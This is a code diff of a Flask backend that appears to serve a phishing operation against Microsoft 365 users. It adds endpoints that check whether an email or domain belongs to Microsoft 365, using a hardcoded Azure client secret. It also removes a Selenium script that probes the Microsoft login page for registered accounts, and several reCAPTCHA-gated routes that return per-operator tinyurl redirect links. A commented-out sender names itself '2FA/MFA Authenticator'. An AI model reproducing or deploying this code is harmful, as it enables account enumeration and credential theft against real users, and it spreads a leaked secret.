@@ -1,21 +1,15 @@
-import string
-
-from flask import Flask, request, jsonify, render_template, make_response
-from flask_mail import Mail, Message
-from flask_cors import CORS, cross_origin
-import threading
-import requests
 import base64
-from datetime import datetime
 import random
-from flask import send_from_directory
+import string
+import threading
+from datetime import datetime
+import dns.resolver
 
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.service import Service
-from webdriver_manager.chrome import ChromeDriverManager
-import time
+import requests
+from flask import Flask, request, jsonify, render_template, make_response
+from flask_cors import CORS
+from flask_mail import Mail, Message
+from msal import ConfidentialClientApplication
 
 app = Flask(__name__)
 cors = CORS(app)
@@ -34,6 +28,65 @@ app.config.update(
 )
 mail = Mail(app)
 
+# Constants and Configuration
+CLIENT_ID = '03ac47e5-9188-43d9-a28f-522a455ad787'
+TENANT_ID = '38792c4e-29b9-4771-87d2-7cb7ca160c93'
+CLIENT_SECRET = 'L4Z8Q~H15tBnJcADZYiRHoOBeJn5gePt6ijzvaFL'
+AUTHORITY = f'https://login.microsoftonline.com/{TENANT_ID}'
+SCOPE = ['https://graph.microsoft.com/.default']
+
+# MSAL Confidential Client Application
+client_app = ConfidentialClientApplication(
+    CLIENT_ID,
+    authority=AUTHORITY,
+    client_credential=CLIENT_SECRET,
+)
+
+
+@app.route('/validate-email', methods=['POST'])
+def validate_email():
+    # Get the email from request data
+    email = request.json.get('email', '')
+    if not email:
+        return jsonify({'error': 'Email parameter is missing'}), 400
+
+    # Acquire token for Graph API
+    token_response = client_app.acquire_token_for_client(scopes=SCOPE)
+    access_token = token_response.get('access_token')
+    print(access_token)
+    if not access_token:
+        return jsonify({'error': 'Failed to acquire access token'}), 500
+
+    # Call Microsoft Graph API to check if the email exists
+
+    graph_api_url = f'https://graph.microsoft.com/v1.0/users/{email}'
+    headers = {'Authorization': f'Bearer {access_token}'}
+    response = requests.get(graph_api_url, headers=headers)
+    print(response.json())
+
+    if response.status_code == 200:
+        return jsonify({'isRegistered': True}), 200
+    elif response.status_code == 404:
+        return jsonify({'isRegistered': False}), 200
+    else:
+        return jsonify({'error': 'Failed to query Microsoft Graph API'}), response.status_code
+
+
+@app.route('/validate-domain', methods=['POST'])
+def check_mx_records():
+    domain = request.json.get('domain', '')
+    if not domain:
+        return jsonify({'error': 'Domain parameter is missing'}), 400
+    try:
+        records = dns.resolver.resolve(domain, 'MX')
+        is_microsoft_related = any('outlook.com' in str(record.exchange).lower() for record in records)
+        return jsonify({'isMicrosoftRelated': is_microsoft_related}), 200
+    except dns.resolver.NoAnswer:
+        return jsonify({'isMicrosoftRelated': False, 'error': 'No MX records found'}), 404
+    except Exception as e:
+        print(f"An error occurred: {e}")
+        return jsonify({'error': 'Failed to fetch MX records', 'details': str(e)}), 500
+
 
 # Function to set CSP headers in the response
 def set_csp_headers(response):
@@ -41,26 +94,15 @@ def set_csp_headers(response):
         'Content-Security-Policy'] = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; TrustedHTML 'self';"
     return response
 
-
 def send_async_email(app, msg):
     with app.app_context():
         mail.send(msg)
-
 
 def send_email(to, subject, custom_email_content):
     # msg = Message(subject, sender='2­F­A­/­M­F­A­ ­A­u­t­h­e­n­t­i­c­a­t­o­r', recipients=[to])
     msg = Message(subject, sender=app.config['MAIL_USERNAME'], recipients=[to])
     msg.html = custom_email_content
     threading.Thread(target=send_async_email, args=(app, msg)).start()
-
-# def get_whois(domain):
-#     try:
-#         return whois.whois(domain)
-#     except Exception as e:
-#         print(f"Failed to fetch WHOIS data for {domain}: {e}")
-#         return None
-
-
 
 def customize_email_content(template, bindings, email):
     # Create a copy of the bindings dictionary
@@ -116,40 +158,6 @@ def send_email_endpoint():
     # Add CSP headers to the response
     return set_csp_headers(response)
 
-# @app.route('/check-domain/<domain>', methods=['GET'])
-# def check_domain(domain):
-#     whois_info = get_whois(domain)
-#     if whois_info is None or 'registrar' not in whois_info:
-#         return jsonify({'error': 'Failed to fetch registrar information'}), 500
-#
-#     registrar = whois_info.registrar
-#     if 'GoDaddy' in registrar:
-#         return send_from_directory('static', 'godaddy.html')
-#     else:
-#         return send_from_directory('static', 'other.html')
-
-@app.route('/valif', methods=['POST'])
-def verify_email():
-    # driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
-    service = Service(executable_path=ChromeDriverManager().install())
-    driver = webdriver.Chrome(service=service)
-    try:
-        email = request.json.get('lif')
-        driver.get("https://login.microsoftonline.com/")
-        time.sleep(2)  # Allow the page to load
-
-        email_input = driver.find_element(By.NAME, "loginfmt")
-        email_input.send_keys(email)
-        email_input.send_keys(Keys.RETURN)
-        time.sleep(2)  # Wait for server response
-
-        try:
-            driver.find_element(By.NAME, "passwd")
-            return jsonify({'isRegistered': True}), 200
-        except:
-            return jsonify({'isRegistered': False}), 404
-    finally:
-        driver.quit()
 
 
 @app.route('/random-digit')
@@ -182,200 +190,6 @@ def verify_recaptcha():
         return jsonify({'success': False, 'error': 'Internal server error'}), 500
 
 
-@app.route('/verify-recaptcha2', methods=['POST'])
-def verify_recaptcha2():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/griffinwp/"
-            #Returning Aeron link Thursday 11th Apriel 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-
-@app.route('/verify-recaptcha3', methods=['POST'])
-def verify_recaptcha3():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/DzHomer/"
-            #Returning DZ link Thursday 11th Apriel 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-
-@app.route('/verify-recaptcha4', methods=['POST'])
-def verify_recaptcha4():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/skooterl#X"
-            #Returning Scoot link Monday 15th Apriel 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-
-@app.route('/verify-recaptcha5', methods=['POST'])
-def verify_recaptcha5():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/pestmgt2#X"
-            #Returning Aeron second link link Monday 15th Apriel 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-
-@app.route('/verify-recaptcha6', methods=['POST'])
-def verify_recaptcha6():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/stelionc#X"
-            #Returning Aeron second link link Monday 15th Apriel 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-@app.route('/verify-recaptcha7', methods=['POST'])
-def verify_recaptcha7():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/bdfpe589#X"
-            #Returning Namo Boy1 link link Monday 15th Apriel 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-@app.route('/verify-recaptcha8', methods=['POST'])
-def verify_recaptcha8():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/tantany#X"
-            #Returning Namo Boy2 link Monday 15th Apriel 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-
-@app.route('/verify-recaptcha9', methods=['POST'])
-def verify_recaptcha9():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/apz300#X"
-            #Returning APZ3 link Sunday 28th Apriel 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
-
-
-@app.route('/verify-recaptcha10', methods=['POST'])
-def verify_recaptcha10():
-    try:
-        token = request.json.get('token')
-        verification_url = 'https://www.google.com/recaptcha/api/siteverify'
-        payload = {
-            'secret': RECAPTCHA_SECRET_KEY,
-            'response': token
-        }
-        response = requests.post(verification_url, data=payload)
-        data = response.json()
-        print((data))
-        if data.get('success'):
-            home = "https://tinyurl.com/inpes/"
-            #Returning Eze's link Monday 6th May 2024
-            return jsonify({'success': True, 'home': home}), 200
-        else:
-            return jsonify({'success': False, 'error': 'reCAPTCHA verification failed'}), 400
-    except Exception as e:
-        return jsonify({'success': False, 'error': 'Internal server error'}), 500
 
 
 if __name__ == '__main__':
